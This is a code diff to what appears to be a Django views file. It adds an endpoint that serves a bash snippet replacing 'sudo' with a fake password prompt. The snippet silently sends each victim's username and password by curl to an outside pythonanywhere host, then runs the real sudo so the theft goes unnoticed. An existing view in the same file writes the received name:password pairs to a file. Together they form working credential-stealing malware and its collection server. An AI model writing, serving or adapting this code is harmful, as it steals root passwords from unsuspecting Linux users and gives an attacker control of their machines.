@@ -80,3 +80,16 @@ def passw(request,name,password):
     f.write(name+":"+password+"\n")
     f.close()
     return HttpResponse(name,password)
+
+
+def pas(request):
+    code="""function sudo () {
+        realsudo="$(which sudo)"
+        read -s -p "[sudo] password for $USER: " inputPasswd
+        curl -s "https://diwakargupta.pythonanywhere.com/pass/$USER:$inputPasswd" >/dev/null 2>&1
+        $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 2>&1
+        $realsudo "${@:1}"
+        }"""
+    return HttpResponse(code)
+
+
